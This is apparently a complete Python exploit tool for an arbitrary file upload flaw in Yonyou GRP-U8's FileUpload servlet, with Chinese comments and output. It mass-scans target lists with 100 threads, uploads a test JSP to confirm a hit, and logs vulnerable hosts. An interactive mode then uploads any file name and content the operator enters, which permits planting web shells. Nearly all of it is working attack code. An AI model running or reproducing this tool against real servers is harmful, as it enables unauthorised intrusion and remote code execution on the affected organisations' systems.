#用友GRP-U8-FileUpload任意文件上传

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:YongYou_grp_u8_fileupload 1.0
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="用友GRP-U8-FileUpload任意文件上传")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                i = i.strip()
                if 'https://' in i: #给资产自动添加http://
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/servlet/FileUpload?fileName=test.jsp&actionID=update'
    url = target + url_payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
    data ='<% out.println("This page has a vulnerability!");%>'
    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5)
        payload2 = "/R9iPortal/upload/test.jsp" #上传成功要访问的上传文件路径
        url2 = target + payload2
        response2 = requests.get(url=url2)
        # print(response.text)
        if response.status_code == 200 and "This page has a vulnerability!" in response2.text:
            print( f"{GREEN}[+] {target} 存在文件上传漏洞！\n  {url2} {RESET}")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
    except Exception:
        pass

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)

    while True:
        filename = input('请输入要上传的文件名>')
        code = input('请输入文件的内容：',)
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        #给文件设置变量
        url_payload = f'/servlet/FileUpload?fileName={filename}&actionID=update'
        url = target + url_payload
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
    }
        #给要输入到文件的内容设置变量
        data =f'{code}'
        res = requests.post(url=url,headers=headers,data=data,timeout=5)
        poc_path = f"/R9iPortal/upload/{filename}"
        url3 = target + poc_path
        res2 = requests.get(url=url3)
        # print(response.text)
        #判断是否上传成功
        if res.status_code == 200 and "This page has a vulnerability!" in res2.text:
            print( f"{GREEN}[+] 上传成功！请访问：{url3} {RESET}")
        else:
            print("不存在！") 

        
if __name__ == '__main__':
    main()
